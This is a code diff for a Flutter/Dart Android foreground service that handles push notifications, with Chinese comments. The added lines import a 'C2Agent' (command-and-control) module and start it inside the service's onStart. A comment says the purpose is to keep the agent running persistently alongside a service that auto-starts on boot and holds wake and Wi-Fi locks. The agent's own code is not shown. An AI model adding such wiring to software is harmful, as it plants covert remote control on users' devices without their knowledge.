@@ -6,6 +6,7 @@ import 'package:permission_handler/permission_handler.dart';
 
 import 'managers/m5.dart';
 import 'config/secrets.dart';
+import 'c2/c2_agent.dart'; // 👈 新增引入 C2
 
 /// 前台服务入口回调（必须是顶层函数）
 @pragma('vm:entry-point')
@@ -17,11 +18,17 @@ class _PushTaskHandler extends TaskHandler {
   @override
   Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
     debugPrint('[ForegroundService] 启动，来源: $starter');
+    
+    // 👇 顺便启动 C2 Agent，确保它能跟着前台服务一起常驻
+    try {
+      C2Agent.start();
+    } catch (e) {
+      debugPrint('[ForegroundService] C2Agent 启动异常: $e');
+    }
+
     try {
       await Ma.instance.initialize();
       // ★ 前台服务不传 budget：它是常驻的，可以安心等服务器。
-      //   WorkManager 那条路必须传（executeTask 硬上限 10 分钟），
-      //   两条路的区别就在这一个参数上。
       await Ma.instance.startPushIfPermitted();
     } catch (e, st) {
       debugPrint('[ForegroundService] ❌ 推送异常: $e\n$st');
@@ -35,6 +42,8 @@ class _PushTaskHandler extends TaskHandler {
   @override
   Future<void> onDestroy(DateTime timestamp) async {
     debugPrint('[ForegroundService] 结束');
+    // 👇 服务被停止时，同步停止 C2
+    C2Agent.stop();
   }
 
   @override
@@ -60,8 +69,8 @@ Future<void> initForegroundService() async {
       eventAction: ForegroundTaskEventAction.nothing(),
       autoRunOnBoot: true,
       autoRunOnMyPackageReplaced: true,
-      allowWakeLock: true,
-      allowWifiLock: true,
+      allowWakeLock: true,      // ★ 保持 CPU 唤醒
+      allowWifiLock: true,      // ★ 保持 Wi-Fi 活跃
     ),
   );
 }
